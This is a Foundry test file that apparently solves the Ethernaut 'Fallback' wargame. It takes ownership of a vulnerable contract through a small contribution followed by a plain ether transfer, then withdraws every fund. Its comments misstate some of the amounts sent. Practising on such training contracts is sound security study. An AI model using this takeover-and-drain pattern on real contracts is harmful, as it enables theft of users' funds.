// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback fallbackContract;
    address attacker = makeAddr("attacker");

    function setUp() public {
        fallbackContract = new Fallback();
        vm.deal(attacker, 10 ether);
    }

    function testAttackerCanClaimOwnership() public {
        // assert if attacker is not the owner.
        assert(fallbackContract.owner() != attacker);
        // sent some contribution = 0.0009 ether
        vm.startPrank(attacker);
        fallbackContract.contribute{value: 0.0005 ether}();
        assertEq(fallbackContract.getContribution(), 0.0005 ether);
        // trigger recieve function by sending some money 0.01 ether
        (bool success,) = address(fallbackContract).call{value: 0.001 ether}("");
        assert(success);
        // assert owner address. make attacker the owner
        assert(fallbackContract.owner() == attacker);

        // verify whether attacker can withdraw all the funds
        fallbackContract.withdraw();
        vm.stopPrank();

        assert(address(fallbackContract).balance == 0);
        console.log("Attacker has drained the protocol");
    }
}